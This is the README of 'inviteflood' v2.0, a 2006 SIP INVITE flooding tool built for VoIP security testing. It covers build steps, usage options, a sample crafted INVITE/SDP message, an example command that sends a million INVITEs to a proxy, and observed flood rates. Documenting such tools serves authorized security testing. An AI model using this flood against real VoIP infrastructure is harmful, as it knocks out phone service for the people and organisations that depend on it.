A tool to perform SIP/SDP INVITE message flooding over UDP/IP. It was tested
on a Linux Red Hat Fedora Core 4 platform (Pentium IV, 2.5 GHz), but it is
expected this tool will successfully build and execute on a variety
of Linux distributions.

    Copyright (c)  2006  Mark D. Collier/Mark O'Brien
    Permission is granted to copy, distribute and/or modify this document
    under the terms of the GNU Free Documentation License, Version 1.2
    or any later version published by the Free Software Foundation;
    with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts.
    A copy of the license is included in the section entitled "GNU
    Free Documentation License".
 
Authors:  Mark D. Collier/Mark O'Brien   06/09/2006  v2.0
          Mark D. Collier/Mark O'Brien   10/12/2004  v1.0
          www.securelogix.com - mark.collier@securelogix.com
          www.hackingexposedvoip.com

This tool was produced with honorable intentions, which are:

  o To aid owners of VoIP infrastructure to test, audit, and uncover security
    vulnerabilities in their deployments.

  o To aid 3rd parties to test, audit, and uncover security vulnerabilities
    in the VoIP infrastructure of owners of said infrastructure who contract
    with or otherwise expressly approve said 3rd parties to assess said
    VoIP infrastructure.

  o To aid producers of VoIP infrastructure to test, audit, and uncover security
    vulnerabilities in the VoIP hardware/software/systems they produce.

  o For use in collective educational endeavors or use by individuals for
    their own intellectual curiosity, amusement, or aggrandizement - absent
    nefarious intent.
   
Unlawful use of this tool is strictly prohibited.

The following open-source libraries of special note were used to build
inviteflood:

1) libnet v1.1.2.1 (tool requires at least this version)
2) hack_library [utility routines - Str2IP( ) GetNextGuid( ) DumpPacket( ) ]
   see www.hackingexposedvoip.com

    Note: The Makefile for inviteflood presumes
          that hack_library.o and hack_library.h reside in
          a folder at ../hack_library relative to the Makefile
          within the inviteflood directory.

Install and build the libraries in accordance with their respective
instructions. Then change to the inviteflood directory and type: make

Appearing below is a SIP INVITE message with SDP payload output from the
tool. The SDP is typical of that output from an Avaya 4602 phone circa
Oct, 2004. The tool builds one INVITE message. The CSeq header field
value is then incremented in each subsequent message and the new value
is also used to replace the last 10 characters of the following header
field values:

the Via branch tag
the From tag
the Call-ID

A change in these values influence the targeted UA server to interpret
each INVITE message as an independent call dialog initiation event,
as opposed to a redundant request. For speed reasons, the update to the
ID/tags are performed "in-place" (i.e. the SIP/SDP message content does
not have to be synthesized each time).

Message injection occurs at layer 3 (i.e. SDP/SIP/UDP/IP layer). The
size of the resulting layer 2 packet varies depending upon the command
line inputs, but generally ends up being approximately 1140 bytes
(Ethernet II).

INVITE sip:5000@proxy1.enterprise1.com SIP/2.0
Via: SIP/2.0/UDP 10.1.101.11:9;branch=33ae0f10-ec74-4416-87bb-390000000001
Max-Forwards: 70
Content-Length: 460
To: 5000 <sip:5000@proxy1.enterprise1.com:5060>
From: <sip:10.1.101.11:9>;tag=33ae1e85-ec74-4416-9701-db0000000001
Call-ID: 33ae2a25-ec74-4416-b627-130000000001
CSeq: 0000000001 INVITE
Supported: timer
Allow: NOTIFY
Allow: REFER
Allow: OPTIONS
Allow: INVITE
Allow: ACK
Allow: CANCEL
Allow: BYE
Content-Type: application/sdp
Contact: <sip:10.1.101.11:9>
Supported: replaces
User-Agent: Elite 1.0 Brcm Callctrl/1.5.1.0 MxSF/v.3.2.6.26
 
v=0
o=MxSIP 0 639859198 IN IP4 10.1.101.11
s=SIP Call
c=IN IP4 10.1.101.11
t=0 0
m=audio 16388 RTP/AVP 0 18 101 102 107 104 105 106 4 8 103
a=rtpmap:0 PCMU/8000
a=rtpmap:18 G729/8000
a=rtpmap:101 BV16/8000
a=rtpmap:102 BV32/16000
a=rtpmap:107 L16/16000
a=rtpmap:104 PCMU/16000
a=rtpmap:105 PCMA/16000
a=rtpmap:106 L16/8000
a=rtpmap:4 G723/8000
a=rtpmap:8 PCMA/8000
a=rtpmap:103 telephone-event/8000
a=fmtp:103 0-15
a=silenceSupp:off - - - -

Make the makefile you find in the same directory as this Readme.txt
file and you should be ready to go. There might be some warnings
dependent upon the compiler vintage.

This version of the tool is transmit only. It is incapable of responding
to authentication challenges or call dialog handshaking. The storm of
signaling messages is actually worsened by not responding to call dialog
handshaking from the targeted SIP network agents. They retry.
        
inviteflood - Version 2.0
              June 09, 2006
 Usage:
 Mandatory -
        interface (e.g. eth0)
        target user (e.g. "" or john.doe or 5000 or "1+210-555-1212")
        target domain (e.g. enterprise.com or an IPv4 address)
        IPv4 addr of flood target (ddd.ddd.ddd.ddd)
        flood stage (i.e. number of packets)
 Optional -
        -a flood tool "From:" alias (e.g. jane.doe)
        -i IPv4 source IP address [default is IP address of interface]
        -S srcPort  (0 - 65535) [default is well-known discard port 9]
        -D destPort (0 - 65535) [default is well-known SIP port 5060]
        -l lineString line used by SNOM [default is blank]
        -s sleep time btwn INVITE msgs (usec)
        -h help - print this usage
        -v verbose output mode

The invocation of the tool producing the SIP message above was:

./inviteflood  eth0  5000  proxy1.enterprise1.com  10.1.101.10  1000000

This invocation might actually target multiple SIP network agents. For 
example, if 10.1.101.10 is the SIP Proxy server. 1,000,000 requests to
INVITE the VoIP phone at x5000 into a call are sent to the SIP Proxy server.
How the SIP Proxy server responds is usually a function of whether
authentication is enabled in the 10.1.101.10 domain. In an unauthenticated
domain, the a SIP Proxy server usually modifies each INVITE request and
forwards it on to the phone at extension x5000. In an authenticated network,
the SIP Proxy server usually challenges the flood tool. So, in an
unauthenticated domain, the SIP proxy and the VoIP phone are both flooded.

Since no -a option was specified, no username appeared in the From URI
or the Contact header lines.

Since no -i option was specified, the source IP address defaulted to
10.1.101.11 (i.e. in this case, the eth0 IP address of the PC running
the inviteflood tool).

Since no -S option was specified, the source port defaulted to 9.

Since no -D option was specified, the source port defaulted to the well-known
SIP port of 5060.

Since no -l (i.e. lower case L) option was specified, the line= parm was not
added to the Request line.

From some non-robust statistical observations, the flood rate had a
fairly wide variance. The output rate from a single instance of the
inviteflood tool running on a Pentium IV, 2.6 GHz, 512 MB RAM PC averaged
about 10 KHz, but burts were observed up to 100 KHz. With two instances
of the inviteflood tool running, the average rate was about 20 KHz. The rate
seemed to drop with three instances of the tool running. In any case,
the Ethernet switch used might have been moderating the flood. During a burst
of messages at 100 KHz, it seemed that messages were being presented to
the SIP Proxy at about 10 KHz (at least as noted by an ethereal capture
on the Proxy Server). It should be emphasized these were casual observations.